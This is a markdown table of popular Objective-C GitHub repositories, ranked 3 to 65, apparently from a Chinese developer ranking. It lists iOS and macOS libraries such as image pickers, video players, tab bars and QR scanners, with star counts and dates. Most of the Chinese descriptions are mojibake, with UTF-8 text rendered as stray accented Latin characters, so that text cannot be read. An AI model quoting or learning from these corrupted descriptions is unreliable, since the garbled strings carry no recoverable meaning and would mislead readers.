|3|[banchichen/TZImagePickerController](https://github.com/banchichen/TZImagePickerController)|‰∏Ä‰∏™ÊîØÊåÅÂ§öÈÄâ„ÄÅÈÄâÂéüÂõæÂíåËßÜÈ¢ëÁöÑÂõæÁâáÈÄâÊã©Âô®ÔºåÂêåÊó∂ÊúâÈ¢ÑËßà„ÄÅË£ÅÂâ™ÂäüËÉΩÔºåÊîØÊåÅiOS6+„ÄÇ  A clone of UIImagePickerController, support picking multiple photos„ÄÅoriginal photo„ÄÅvideo, also allow preview photo and video, support iOS6+|7.4k|Objective-C|10/29|
|4|[halfrost/Halfrost-Field](https://github.com/halfrost/Halfrost-Field)|‚úçüèª ËøôÈáåÊòØÂÜôÂçöÂÆ¢ÁöÑÂú∞Êñπ ‚Äî‚Äî Halfrost-Field ÂÜ∞Èúú‰πãÂú∞|6.8k|Objective-C|09/20|
|5|[renzifeng/ZFPlayer](https://github.com/renzifeng/ZFPlayer)|Support customization of any player SDK and control layer(ÊîØÊåÅÂÆöÂà∂‰ªª‰ΩïÊí≠ÊîæÂô®SDKÂíåÊéßÂà∂Â±Ç)|6.4k|Objective-C|09/18|
|6|[ChenYilong/CYLTabBarController](https://github.com/ChenYilong/CYLTabBarController)|[EN]It is an iOS UI module library for adding animation to iOS tabbar items and icons with Lottie, and adding a bigger center UITabBar Item.  [CN]„Äê‰∏≠ÂõΩÁâπËâ≤ TabBar„Äë‰∏ÄË°å‰ª£Á†ÅÂÆûÁé∞ Lottie Âä®ÁîªTabBarÔºåÊîØÊåÅ‰∏≠Èó¥Â∏¶+Âè∑ÁöÑTabBarÊ†∑ÂºèÔºåËá™Â∏¶Á∫¢ÁÇπËßíÊ†áÔºåÊîØÊåÅÂä®ÊÄÅÂà∑Êñ∞„ÄÇ„ÄêiOS13 & Dark Mode  & iPhone XS MAX supported„Äë|6.3k|Objective-C|05/19|
|7|[gsdios/SDCycleScrollView](https://github.com/gsdios/SDCycleScrollView)|Autoscroll Banner.   Êó†ÈôêÂæ™ÁéØÂõæÁâá„ÄÅÊñáÂ≠óËΩÆÊí≠Âô®„ÄÇ|5.9k|Objective-C|09/27|
|8|[Tencent/QMUI_iOS](https://github.com/Tencent/QMUI_iOS)|QMUI iOS‚Äî‚ÄîËá¥Âäõ‰∫éÊèêÈ´òÈ°πÁõÆ UI ÂºÄÂèëÊïàÁéáÁöÑËß£ÂÜ≥ÊñπÊ°à|5.9k|Objective-C|09/29|
|9|[Sunnyyoung/WeChatTweak-macOS](https://github.com/Sunnyyoung/WeChatTweak-macOS)|A dynamic library tweak for WeChat macOS - È¶ñÊ¨æÂæÆ‰ø° macOS ÂÆ¢Êà∑Á´ØÊí§ÂõûÊã¶Êà™‰∏éÂ§öÂºÄ|5.1k|Objective-C|04/28|
|10|[pujiaxin33/JXCategoryView](https://github.com/pujiaxin33/JXCategoryView)|A powerful and easy to use category view (segmentedcontrol, segmentview, pagingview, pagerview, pagecontrol) (ËÖæËÆØÊñ∞Èóª„ÄÅ‰ªäÊó•Â§¥Êù°„ÄÅQQÈü≥‰πê„ÄÅÁΩëÊòì‰∫ëÈü≥‰πê„ÄÅ‰∫¨‰∏ú„ÄÅÁà±Â•áËâ∫„ÄÅËÖæËÆØËßÜÈ¢ë„ÄÅÊ∑òÂÆù„ÄÅÂ§©Áå´„ÄÅÁÆÄ‰π¶„ÄÅÂæÆÂçöÁ≠âÊâÄÊúâ‰∏ªÊµÅAPPÂàÜÁ±ªÂàáÊç¢ÊªöÂä®ËßÜÂõæ)|4.9k|Objective-C|10/28|
|11|[crazycodeboy/RNStudyNotes](https://github.com/crazycodeboy/RNStudyNotes)|React Native Á†îÁ©∂‰∏éÂÆûË∑µ|3.8k|Objective-C|07/27|
|12|[alibaba/LuaViewSDK](https://github.com/alibaba/LuaViewSDK)|A cross-platform framework to build native, dynamic and swift user interface - Âº∫Â§ßËΩªÂ∑ßÁÅµÊ¥ªÁöÑÂÆ¢Êà∑Á´ØÂä®ÊÄÅÂåñËß£ÂÜ≥ÊñπÊ°à|3.5k|Objective-C|02/11|
|13|[CoderZhuXH/XHLaunchAd](https://github.com/CoderZhuXH/XHLaunchAd)|üî•The screen opening advertising solutions - ÂºÄÂ±èÂπøÂëä„ÄÅÂêØÂä®ÂπøÂëäËß£ÂÜ≥ÊñπÊ°à-ÊîØÊåÅÈùôÊÄÅ/Âä®ÊÄÅÂõæÁâáÂπøÂëä,mp4ËßÜÈ¢ëÂπøÂëä,ÂÖ®Â±è/ÂçäÂ±èÂπøÂëä„ÄÅÂÖºÂÆπiPhone/iPad. „Äê Github‰∏ãËΩΩ‰∏ç‰∫Ü/‰∏ãËΩΩÊÖ¢ ÂèØ‰ª•ËÆøÈóÆÂõΩÂÜÖ‰∏ãËΩΩÂú∞ÂùÄ: https://gitee.com/CoderZhuXH/XHLaunchAd„Äë|3.4k|Objective-C|05/06|
|14|[JackJiang2011/MobileIMSDK](https://github.com/JackJiang2011/MobileIMSDK)|‰∏Ä‰∏™ÂéüÂàõÁßªÂä®Á´ØIMÈÄö‰ø°Â±ÇÊ°ÜÊû∂ÔºåËΩªÈáèÁ∫ß„ÄÅÈ´òÂ∫¶ÊèêÁÇºÔºåÂéÜÁªè8Âπ¥„ÄÅ‰πÖÁªèËÄÉÈ™å„ÄÇÂèØËÉΩÊòØÂ∏ÇÈù¢‰∏äÂîØ‰∏ÄÂêåÊó∂ÊîØÊåÅUDP+TCP‰∏§ÁßçÂçèËÆÆÁöÑÂêåÁ±ªÊ°ÜÊû∂ÔºåÊîØÊåÅiOS„ÄÅAndroid„ÄÅJavaÔºåÊúçÂä°Á´ØÂü∫‰∫éNetty„ÄÇ|3.2k|Objective-C|10/23|
|15|[zhengwenming/WMPlayer](https://github.com/zhengwenming/WMPlayer)|WMPlayer-AVPlayerÁöÑÂ∞ÅË£ÖÔºåÁªßÊâøUIViewÔºåÊîØÊåÅpodsÔºåÊâãÂäøÂø´Ëøõ„ÄÅÂø´ÈÄÄÔºåÂÖ®Èù¢ÈÄÇÈÖçÂÖ®Èù¢Â±èÔºåÂêåÊó∂ÊîØÊåÅÁΩëÁªúÂíåÊú¨Âú∞ËßÜÈ¢ëÁöÑÊí≠Êîæ|3.1k|Objective-C|06/08|
|16|[MxABC/LBXScan](https://github.com/MxABC/LBXScan)|A barcode and qr code scanner (‰∫åÁª¥Á†Å„ÄÅÊâ´Á†Å„ÄÅÊâ´‰∏ÄÊâ´„ÄÅZXing„ÄÅZBar„ÄÅiOSÁ≥ªÁªüAVFoundationÊâ´Á†ÅÂ∞ÅË£ÖÔºåÊâ´Á†ÅÁïåÈù¢ÊïàÊûúÂ∞ÅË£Ö)|3.0k|Objective-C|10/16|
|17|[12207480/TYAttributedLabel](https://github.com/12207480/TYAttributedLabel)|TYAttributedLabel ÁÆÄÂçïÔºåÂº∫Â§ßÁöÑÂ±ûÊÄßÊñáÊú¨Êéß‰ª∂(Êó†ÈúÄ‰∫ÜËß£CoreText)ÔºåÊîØÊåÅÂõæÊñáÊ∑∑ÊéíÊòæÁ§∫ÔºåÊîØÊåÅÊ∑ªÂä†ÈìæÊé•ÔºåimageÂíåUIViewÊéß‰ª∂ÔºåÊîØÊåÅËá™ÂÆö‰πâÊéíÁâàÊòæÁ§∫|2.8k|Objective-C|09/24|
|18|[wangrui460/WRNavigationBar](https://github.com/wangrui460/WRNavigationBar)|Ô£øË∂ÖÁÆÄÂçïÔºÅÔºÅÔºÅ ‰∏ÄË°å‰ª£Á†ÅËÆæÁΩÆÁä∂ÊÄÅÊ†è„ÄÅÂØºËà™Ê†èÊåâÈíÆ„ÄÅÊ†áÈ¢ò„ÄÅÈ¢úËâ≤„ÄÅÈÄèÊòéÂ∫¶ÔºåÁßªÂä®Á≠â    WRNavigationBar which allows you to change NavigationBar's appearance dynamically|2.8k|Objective-C|05/09|
|19|[ripperhe/Bob](https://github.com/ripperhe/Bob)|Bob ÊòØ‰∏ÄÊ¨æ Mac Á´ØÁøªËØëËΩØ‰ª∂ÔºåÊîØÊåÅÂàíËØçÁøªËØë„ÄÅÊà™ÂõæÁøªËØë‰ª•ÂèäÊâãÂä®ËæìÂÖ•ÁøªËØë„ÄÇ|2.7k|Objective-C|10/23|
|20|[rime/squirrel](https://github.com/rime/squirrel)|„ÄêÈº†È¨öÁÆ°„ÄëRime for macOS|2.7k|Objective-C|09/21|
|21|[liberalisman/iOS-InterviewQuestion-collection](https://github.com/liberalisman/iOS-InterviewQuestion-collection)|iOS ÂºÄÂèëËÄÖÂú®Èù¢ËØïËøáÁ®ã‰∏≠ÔºåÂ∏∏ËßÅÁöÑ‰∏Ä‰∫õÈù¢ËØïÈ¢òÔºåÂª∫ËÆÆÂ∞ΩÈáèÂºÑÊáÇ‰∫ÜÂéüÁêÜÔºåÂπ∂‰∏îÂ§öÂÆûË∑µ„ÄÇ|2.5k|Objective-C|09/27|
|22|[tigerAndBull/TABAnimated](https://github.com/tigerAndBull/TABAnimated)|A skeleton screen framework based on native for iOS. (‰∏Ä‰∏™Áî±iOSÂéüÁîüÁªÑ‰ª∂Êò†Â∞ÑÂá∫È™®Êû∂Â±èÁöÑÊ°ÜÊû∂ÔºåÂåÖÂê´Âø´ÈÄüÊ§çÂÖ•Ôºå‰ΩéËÄ¶ÂêàÔºåÂÖºÂÆπÂ§çÊùÇËßÜÂõæÁ≠âÁâπÁÇπÔºåÊèê‰æõÂõΩÂÜÖ‰∏ªÊµÅÈ™®Êû∂Â±èÂä®ÁîªÁöÑÂä†ËΩΩÊñπÊ°àÔºåÂêåÊó∂ÊîØÊåÅ‰∏äÊãâÂä†ËΩΩÊõ¥Â§ö„ÄÅËá™ÂÆöÂà∂Âä®Áîª„ÄÇ)|2.3k|Objective-C|10/27|
|23|[meili/MGJRouter](https://github.com/meili/MGJRouter)|‰∏Ä‰∏™È´òÊïà/ÁÅµÊ¥ªÁöÑ iOS URL Router|2.3k|Objective-C|07/24|
|24|[leancloud/ChatKit-OC](https://github.com/leancloud/ChatKit-OC)|Ê≠§È°πÁõÆÂ∑≤ÁªèÂ∫üÂºÉÔºå‰ª•Âêé‰∏çÂÜçÁª¥Êä§„ÄÇÊàë‰ª¨Êé®Âá∫‰∫ÜÂü∫‰∫é Swift SDK ÁöÑ Chat Demo„ÄÇ|2.2k|Objective-C|06/15|
|25|[iodefog/VipVideo](https://github.com/iodefog/VipVideo)|ÂêÑÂ§ßÁΩëÁ´ôvipËßÜÈ¢ëÂÖçË¥πËßÇÁúã Á≠â MacÁâà„ÄÇ‰ªòË¥πÁîµÂΩ±ÔºåVIP‰ºöÂëòÂâßÁ≠âÔºåÂéªÂπøÂëäÊí≠Êîæ„ÄÇËá™Áî®ËßÜÈ¢ëÊàñËÄÖÁîµÂΩ±URLÔºåÈü≥‰πêÁ†¥Ëß£URLÔºåCCTVÁ≠âÁîµËßÜÊí≠ÊîæURL|2.2k|Objective-C|07/02|
|26|[WillkYang/YYKline](https://github.com/WillkYang/YYKline)|iOS YYKlineÔºöKline„ÄÅChart„ÄÅVolume„ÄÅScroll„ÄÅScale„ÄÅMACD„ÄÅKDJ„ÄÅKÁ∫øÂõæ„ÄÅÂàÜÊó∂Âõæ...|2.2k|Objective-C|10/27|
|27|[objccn/articles](https://github.com/objccn/articles)|Articles for objccn.io. objc.ioÁöÑÂÆåÊï¥„ÄÅÂáÜÁ°Æ„ÄÅ‰ºòÈõÖÁöÑ‰∏≠ÊñáÁøªËØëÁâàÊú¨|2.1k|Objective-C|04/08|
|28|[zuoqing1988/ZQCNN](https://github.com/zuoqing1988/ZQCNN)|‰∏ÄÊ¨æÊØîmini-caffeÊõ¥Âø´ÁöÑForwardÂ∫ìÔºåËßâÂæóÂ•ΩÁî®ËØ∑ÁÇπÊòüÂïäÔºå400ÊòüÂÖ¨Â∏ÉÂø´ÈÄü‰∫∫ËÑ∏Ê£ÄÊµãÊ®°ÂûãÔºå500ÊòüÂÖ¨Â∏É106ÁÇπlandmarkÔºå600ÊòüÂÖ¨Â∏É‰∫∫Â§¥Ê£ÄÊµãÊ®°ÂûãÔºå700ÊòüÂÖ¨Â∏É‰∫∫ËÑ∏Ê£ÄÊµãÂ•óÈ§êÔºàÂÖ≠Áßçpnet,‰∏§ÁßçrnetÈöèÊÑèÊ∑∑Âêà‰ΩøÁî®Êª°Ë∂≥ÂêÑÁßçÈÄüÂ∫¶/Á≤æÂ∫¶Ë¶ÅÊ±ÇÔºâÔºå800ÊòüÂÖ¨Â∏ÉÊõ¥ÂáÜÁöÑ106ÁÇπÊ®°Âûã|2.0k|Objective-C|10/23|
|29|[eseedo/iOSCourse](https://github.com/eseedo/iOSCourse)|iOSÂºÄÂèëÂàùÂ≠¶ËÄÖÂÖ•Èó®|1.9k|Objective-C|05/16|
|30|[SilenceLove/HXPhotoPicker](https://github.com/SilenceLove/HXPhotoPicker)|ÂõæÁâá/ËßÜÈ¢ëÈÄâÊã©Âô® - ÊîØÊåÅLivePhoto„ÄÅGIFÂõæÁâáÈÄâÊã©„ÄÅ3DTouchÈ¢ÑËßà„ÄÅÂú®Á∫ø‰∏ãËΩΩiCloud‰∏äÁöÑËµÑÊ∫ê„ÄÅÁºñËæëÂõæÁâá/ËßÜÈ¢ë„ÄÅÊµèËßàÁΩëÁªúÂõæÁâá ÂäüËÉΩ    Imitation wx photo/image picker - support for LivePhoto, GIF image selection, 3DTouch preview, Download the resources on iCloud online, browse the web image function|1.9k|Objective-C|10/29|
|31|[pili-engineering/PLPlayerKit](https://github.com/pili-engineering/PLPlayerKit)|PLPlayerKit ÊòØ‰∏ÉÁâõÊé®Âá∫ÁöÑ‰∏ÄÊ¨æÂÖçË¥πÁöÑÈÄÇÁî®‰∫é iOS Âπ≥Âè∞ÁöÑÊí≠ÊîæÂô® SDKÔºåÈááÁî®ÂÖ®Ëá™Á†îÁöÑË∑®Âπ≥Âè∞Êí≠ÊîæÂÜÖÊ†∏ÔºåÊã•Êúâ‰∏∞ÂØåÁöÑÂäüËÉΩÂíå‰ºòÂºÇÁöÑÊÄßËÉΩÔºåÂèØÈ´òÂ∫¶ÂÆöÂà∂ÂåñÂíå‰∫åÊ¨°ÂºÄÂèë„ÄÇ|1.9k|Objective-C|05/22|
|32|[91renb/BRPickerView](https://github.com/91renb/BRPickerView)|BRPickerView Â∞ÅË£ÖÁöÑÊòØiOS‰∏≠Â∏∏Áî®ÁöÑÈÄâÊã©Âô®ÁªÑ‰ª∂Ôºå‰∏ªË¶ÅÂåÖÊã¨ÔºöÊó•ÊúüÈÄâÊã©Âô®ÔºàÊîØÊåÅÂπ¥ÊúàÊó•„ÄÅÂπ¥ÊúàÁ≠â15ÁßçÊó•ÊúüÊ†∑ÂºèÈÄâÊã©ÔºåÊîØÊåÅËÆæÁΩÆÊòüÊúü„ÄÅËá≥‰ªäÁ≠âÔºâ„ÄÅÂú∞ÂùÄÈÄâÊã©Âô®ÔºàÊîØÊåÅÁúÅÂ∏ÇÂå∫„ÄÅÁúÅÂ∏Ç„ÄÅÁúÅ‰∏âÁßçÂú∞Âå∫ÈÄâÊã©Ôºâ„ÄÅËá™ÂÆö‰πâÂ≠óÁ¨¶‰∏≤ÈÄâÊã©Âô®ÔºàÊîØÊåÅÂçïÂàó„ÄÅÂ§öÂàó„ÄÅ‰∫åÁ∫ßËÅîÂä®„ÄÅ‰∏âÁ∫ßËÅîÂä®ÈÄâÊã©Ôºâ„ÄÇÊîØÊåÅËá™ÂÆö‰πâ‰∏ªÈ¢òÊ†∑ÂºèÔºåÈÄÇÈÖçÊ∑±Ëâ≤Ê®°ÂºèÔºåÊîØÊåÅÂ∞ÜÈÄâÊã©Âô®ÁªÑ‰ª∂Ê∑ªÂä†Âà∞ÊåáÂÆöÂÆπÂô®ËßÜÂõæ„ÄÇ|1.8k|Objective-C|09/25|
|33|[pujiaxin33/JXPagingView](https://github.com/pujiaxin33/JXPagingView)|Á±ª‰ººÂæÆÂçö‰∏ªÈ°µ„ÄÅÁÆÄ‰π¶‰∏ªÈ°µÁ≠âÊïàÊûú„ÄÇÂ§öÈ°µÈù¢ÂµåÂ•óÔºåÊó¢ÂèØ‰ª•‰∏ä‰∏ãÊªëÂä®Ôºå‰πüÂèØ‰ª•Â∑¶Âè≥ÊªëÂä®ÂàáÊç¢È°µÈù¢„ÄÇÊîØÊåÅHeaderViewÊÇ¨ÊµÆ„ÄÅÊîØÊåÅ‰∏ãÊãâÂà∑Êñ∞„ÄÅ‰∏äÊãâÂä†ËΩΩÊõ¥Â§ö„ÄÇ|1.8k|Objective-C|09/23|
|34|[changsanjiang/SJVideoPlayer](https://github.com/changsanjiang/SJVideoPlayer)|iOS VideoPlayer MediaPlayer video player media player Áü≠ËßÜÈ¢ëÊí≠ÊîæÂô® ÂèØÊé•ÂÖ• ijkplayer aliplayer alivodplayer plplayer|1.7k|Objective-C|10/22|
|35|[youusername/magnetX](https://github.com/youusername/magnetX)|ËµÑÊ∫êÊêúÁ¥¢ÂûãËΩØ‰ª∂ macOS OSX magnet|1.6k|Objective-C|07/15|
|36|[zhengwenming/WeChat](https://github.com/zhengwenming/WeChat)|ÂÆûÁé∞Á±ª‰ººÂæÆ‰ø°ÊúãÂèãÂúàÊàñËÄÖQQÁ©∫Èó¥ÔºåËØÑËÆ∫ÂõûÂ§çÔºå‰πùÂÆ´Ê†ºÂ∏ÉÂ±Ä„ÄÇÂ§ÑÁêÜÈîÆÁõòÂºπÂá∫ÂêéÂÆö‰ΩçÂà∞ÂΩìÂâçÁÇπÂáªÁöÑË¢´ËØÑËÆ∫‰∫∫Â§Ñ„ÄÇÂè¶ÔºöÊªëÂä®Êó∂ÂÄôFPSÂú®57-60‰πãÈó¥ÔºåÁ∫µ‰∫´‰∏ùÊªëÔºÅ|1.6k|Objective-C|04/13|
|37|[lefex/iWeChat](https://github.com/lefex/iWeChat)|‰ªé 0 ÂºÄÂßãËß£Âà®‰∏Ä‰∏™ AppÔºå‰ª•ÂæÆ‰ø°‰∏∫‰æã|1.5k|Objective-C|09/26|
|38|[kingsic/SGQRCode](https://github.com/kingsic/SGQRCode)|The easy to use Barcode and QR code scan library for iOS„ÄêiOS ÂéüÁîü‰∫åÁª¥Á†ÅÁîüÊàê‰∏éÊâ´Êèè -> È´ò‰ªøÂæÆ‰ø°„Äë|1.5k|Objective-C|10/22|
|39|[zhenglibao/FlexLib](https://github.com/zhenglibao/FlexLib)|FlexLibÊòØ‰∏Ä‰∏™Âü∫‰∫éflexboxÊ®°ÂûãÔºå‰ΩøÁî®xmlÊñá‰ª∂ËøõË°åÁïåÈù¢Â∏ÉÂ±ÄÁöÑÊ°ÜÊû∂ÔºåËûçÂêà‰∫ÜwebÂø´ÈÄüÂ∏ÉÂ±ÄÁöÑËÉΩÂäõÔºåËÆ©iOSÁïåÈù¢ÂºÄÂèëÂÉèÂÜôÁΩëÈ°µ‰∏ÄÊ†∑ÁÆÄÂçïÂø´ÈÄü|1.5k|Objective-C|10/26|
|40|[kingsic/SGPagingView](https://github.com/kingsic/SGPagingView)|A powerful and easy to use segment control „ÄêQQ„ÄÅÊ∑òÂÆù„ÄÅÂæÆÂçö„ÄÅËÖæËÆØ„ÄÅÁΩëÊòìÊñ∞Èóª„ÄÅ‰ªäÊó•Â§¥Êù°Á≠âÊ†áÈ¢òÊªöÂä®ËßÜÂõæ„Äë|1.4k|Objective-C|07/17|
|41|[suifengqjn/TBPlayer](https://github.com/suifengqjn/TBPlayer)|ËßÜÈ¢ëËæπ‰∏ãËæπÊí≠Êí≠ÔºåÊääÊí≠ÊîæÂô®Êí≠ÊîæËøáÁöÑÊï∞ÊçÆÊµÅÁºìÂ≠òÂà∞Êú¨Âú∞ÔºåÊîØÊåÅÊãñÂä®„ÄÇÈááÁî®avplayer|1.3k|Objective-C|06/28|
|42|[netease-im/NIM_iOS_UIKit](https://github.com/netease-im/NIM_iOS_UIKit)|ÁΩëÊòì‰∫ë‰ø° iOS UI ÁªÑ‰ª∂ÔºåÊèê‰æõËÅäÂ§©ÁïåÈù¢ÔºåÊñáÊú¨Ê∂àÊÅØÔºåÂõæÁâáÊ∂àÊÅØÔºåËØ≠Èü≥Ê∂àÊÅØÔºåËßÜÈ¢ëÊ∂àÊÅØÔºåÂú∞ÁêÜ‰ΩçÁΩÆÊ∂àÊÅØÔºåËá™ÂÆö‰πâÊ∂àÊÅØÔºàÈòÖÂêéÂç≥ÁÑöÔºâÁ≠âÊ∂àÊÅØÁ§∫‰æã„ÄÇ#Êé®ËçêÂ•ΩÂèã‰ΩøÁî®ÁΩëÊòì‰∫ë‰ø°#ÊØèÂçïÂèØÂæó500ÂÖÉ‰∫¨‰∏úÂç°ÔºÅhttps://yunxin.163.com/promotion/recommend|1.3k|Objective-C|10/22|
|43|[jpush/jpush-react-native](https://github.com/jpush/jpush-react-native)|JPush's officially supported React Native plugin (Android & iOS). ÊûÅÂÖâÊé®ÈÄÅÂÆòÊñπÊîØÊåÅÁöÑ React Native Êèí‰ª∂ÔºàAndroid & iOSÔºâ„ÄÇ|1.2k|Objective-C|09/23|
|44|[LeoMobileDeveloper/Blogs](https://github.com/LeoMobileDeveloper/Blogs)|‰∏ÄÁÇπÂøÉÂæó - iOS,Swift,React Native,Python...|1.2k|Objective-C|07/23|
|45|[WillkYang/YYStock](https://github.com/WillkYang/YYStock)|iOS YYStock-v2.0Ôºötimeline chart, long press, pinch, full-screenÔºåKÁ∫øÂõæ...|1.2k|Objective-C|09/10|
|46|[jezzmemo/JJException](https://github.com/jezzmemo/JJException)|Protect the objective-c application(‰øùÊä§App‰∏çÈó™ÈÄÄ)|1.2k|Objective-C|09/05|
|47|[li6185377/LKDBHelper-SQLite-ORM](https://github.com/li6185377/LKDBHelper-SQLite-ORM)|ÂÖ®Ëá™Âä®ÁöÑÊèíÂÖ•,Êü•ËØ¢,Êõ¥Êñ∞,Âà†Èô§Ôºå an automatic database operation  thread-safe and not afraid of recursive deadlock|1.2k|Objective-C|09/15|
|48|[GGGHub/Reader](https://github.com/GGGHub/Reader)|iOSÂü∫‰∫éCoreTextÂÆûÁé∞ÁöÑÁîµÂ≠ê‰π¶ÈòÖËØªÂô®ÔºåÊîØÊåÅtxtÔºåepubÊ†ºÂºè|1.1k|Objective-C|06/04|
|49|[liangdahong/BMLongPressDragCellCollectionView](https://github.com/liangdahong/BMLongPressDragCellCollectionView)|üéâ üéâ üéâ üéâ üéâ  ËÆ©‰Ω†ËΩªÊùæÂÆûÁé∞Á±ª‰ººÊîØ‰ªòÂÆùÁöÑÊãñÊãΩÈáçÊéíÂäüËÉΩ, ÊîØÊåÅÂêÑÁßçËá™ÂÆö‰πâÊìç‰Ωú„ÄÇ|1.0k|Objective-C|09/24|
|50|[lixiang1994/LEEAlert](https://github.com/lixiang1994/LEEAlert)|‰ºòÈõÖÁöÑÂèØËá™ÂÆö‰πâ Alert ActionSheet|1.0k|Objective-C|10/10|
|51|[DaidoujiChen/Dai-Hentai](https://github.com/DaidoujiChen/Dai-Hentai)|‰∏ÄÂÄãÊôÆÈÄöÁöÑÁúãÊº´Áï´ App|945|Objective-C|10/14|
|52|[yulingtianxia/TBActionSheet](https://github.com/yulingtianxia/TBActionSheet)|A Custom&Powerful Action Sheet For iOS. ‰∏Ä‰∏™ ActionSheet Êª°Ë∂≥ÊâÄÊúâÊ†∑ÂºèÔºÅË∂ÖÈ´òËá™Áî±Â∫¶ÁöÑÂèØÂÆöÂà∂ÔºÅ|935|Objective-C|06/05|
|53|[SunshineBrother/JHBlog](https://github.com/SunshineBrother/JHBlog)|iOSÂºÄÂèëÔºöÊàëÁöÑÂàùÁ∫ßÂà∞‰∏≠Á∫ßÁöÑÊôãÁ∫ß‰πãË∑Ø|909|Objective-C|10/24|
|54|[CoderMikeHe/MHDevelopExample_Objective_C](https://github.com/CoderMikeHe/MHDevelopExample_Objective_C)|üî•üî•üî•  iOSÂºÄÂèëÊäÄÊúØË¶ÅÁÇπÊ±áÊÄªÔºåÊ†∏ÂøÉÂäüËÉΩÈÖçÂ§áÊñáÊ°£„ÄÇË°®ÊÉÖÈîÆÁõòÂ∏ÉÂ±Ä„ÄÅÂ§ßÊñá‰ª∂ÂàÜÁâá‰∏ä‰º†„ÄÅÂü∫‰∫éMVCÁöÑÂü∫Á±ªËÆæËÆ°„ÄÅMVVM+RACÂÆûË∑µ„ÄÅÂæÆ‰ø°ÊúãÂèãÂúàÂÆûÁé∞ÊñπÊ°àÁ≠â„ÄÇ|876|Objective-C|06/23|
|55|[netyouli/WHC_AutoLayoutKit](https://github.com/netyouli/WHC_AutoLayoutKit)|iOS and Mac OS X platforms currently in use the fastest the simplest development to build the UI layout automatically open source library, strong dynamic layout constraint handling capacityÔºåiOS/Mac OS XÂπ≥Âè∞‰∏äÁõÆÂâç‰ΩøÁî®ÊúÄÁÆÄÂçïÂºÄÂèëÊûÑÂª∫UIÈÄüÂ∫¶ÊúÄÂø´ÁöÑËá™Âä®Â∏ÉÂ±ÄÂºÄÊ∫êÂ∫ìÔºåÂº∫ÊÇçÁöÑÂä®ÊÄÅÂ∏ÉÂ±ÄÁ∫¶ÊùüÂ§ÑÁêÜËÉΩÂäõ|859|Objective-C|05/31|
|56|[QuintGao/GKPageScrollView](https://github.com/QuintGao/GKPageScrollView)|iOSÁ±ª‰ººÂæÆÂçö„ÄÅÊäñÈü≥„ÄÅÁΩëÊòì‰∫ëÁ≠â‰∏™‰∫∫ËØ¶ÊÉÖÈ°µÊªëÂä®ÂµåÂ•óÊïàÊûú|840|Objective-C|10/22|
|57|[ksvc/KSYLive_iOS](https://github.com/ksvc/KSYLive_iOS)|ÈáëÂ±±‰∫ëÁõ¥Êí≠SDK [ iOSÊé®ÊµÅ+Êí≠Êîæ ]ËûçÂêàÁâà ÊîØÊåÅÁæéÈ¢úÊª§Èïú(Beauty Filter)„ÄÅÁæéÂ£∞(Beauty Voice)„ÄÅËΩØÁ°¨Áºñ(Software/Hardware Encoder) „ÄÅÁΩëÁªúËá™ÈÄÇÂ∫î(Network Auto Adapt)„ÄÅÊ∑∑Èü≥(Audio Mixer)„ÄÅÊ∑∑Âìç(Reverb)„ÄÅÁîª‰∏≠Áîª(PIP)|833|Objective-C|04/19|
|58|[renmoqiqi/100-Days-Of-iOS-DataStructure-Algorithm](https://github.com/renmoqiqi/100-Days-Of-iOS-DataStructure-Algorithm)|100Â§©iOSÊï∞ÊçÆÁªìÊûÑ‰∏éÁÆóÊ≥ïÂÆûÊàò |828|Objective-C|03/25|
|59|[yuwind/HHTransition](https://github.com/yuwind/HHTransition)|‰∏ªÊµÅËΩ¨Âú∫Âä®ÁîªÔºåÊó†‰æµÂÖ•ÔºåAPIÁÆÄÂçïÊòìÁî®„ÄÇ|824|Objective-C|09/30|
|60|[wildfirechat/ios-chat](https://github.com/wildfirechat/ios-chat)|ÂºÄÊ∫êÁöÑÂç≥Êó∂ÈÄöËÆØ(ÈáéÁÅ´IM)Á≥ªÁªü|794|Objective-C|10/29|
|61|[lyb5834/YBPopupMenu](https://github.com/lyb5834/YBPopupMenu)|Âø´ÈÄüÈõÜÊàêpopupMenu|790|Objective-C|06/01|
|62|[CoderMikeHe/WeChat](https://github.com/CoderMikeHe/WeChat)|üî• iOS Âà©Áî®MVVM + RAC + ViewModel-Based NavigationÊù•Êê≠Âª∫ÂæÆ‰ø°(WeChat 7.0.0+)ÁöÑÊï¥‰ΩìÂü∫Êú¨Êû∂ÊûÑÔºå‰ª•ÂèäÂÆûÁé∞ÂæÆ‰ø°ÊúãÂèãÂúà„ÄÅÈÄöËÆØÂΩï„ÄÅ‰∏ãÊãâÂ∞èÁ®ãÂ∫è„ÄÅÊêúÁ¥¢Á≠â‰∏ªË¶ÅÂäüËÉΩÔºå‰ª£Á†ÅËßÑËåÉÊÉä‰∏∫Â§©‰∫∫„ÄÅÊ≥®ÈáäËØ¶Ëß£‰ª§‰∫∫ÂèëÊåá„ÄÅÁªÜËäÇÂ§ÑÁêÜÁ≤æÁõäÊ±ÇÁ≤æ„ÄÅÊ†∏ÂøÉÂäüËÉΩÈÖçÂ§áÊñáÊ°£„ÄÅÊé•Ëøë98%ËøòÂéüÂ∫¶ÁöÑÂéüÁîüAppËßÜËßâ‰ΩìÈ™åÔºå‰ª£Á†Å‰∏çÂ§öÔºåÊ≥®ÈáäÂ§ö„ÄÇÔºàÊåÅÁª≠Êõ¥Êñ∞ÔºåÊï¨ËØ∑ÊúüÂæÖÔºåÊ¨¢ËøéStarÂíåFork‚Ä¶Ôºâ|758|Objective-C|10/27|
|63|[ChinaArJun/Tencent-NOW](https://github.com/ChinaArJun/Tencent-NOW)|üî•üî•üî•iOSËßÜÈ¢ëÁõ¥Êí≠:‰ªøËÖæËÆØÊóó‰∏ã < NOW > Áõ¥Êí≠¬†ÊñóÈ±º ÊäñÈü≥ ÁÅ´Â±±ËßÜÈ¢ë Ëä±Ê§í ÁÜäÁå´ YY ÈôåÈôå Êò†ÂÆ¢ Áõ¥Êí≠APP  iOS  Live video|749|Objective-C|05/05|
|64|[QuintGao/GKPhotoBrowser](https://github.com/QuintGao/GKPhotoBrowser)|iOS‰ªøÂæÆ‰ø°„ÄÅ‰ªäÊó•Â§¥Êù°Á≠âÂõæÁâáÊµèËßàÂô®|747|Objective-C|10/22|
|65|[didi/echo](https://github.com/didi/echo)|EchoÊòØ‰∏ÄÊ¨æÊ°åÈù¢Á´ØË∞ÉËØïÂ∑•ÂÖ∑ÔºåÊó®Âú®ÊèêÈ´òÂÆ¢Êà∑Á´ØÁöÑÁ†îÂèëË∞ÉËØïÊïàÁéá|735|Objective-C|09/29|
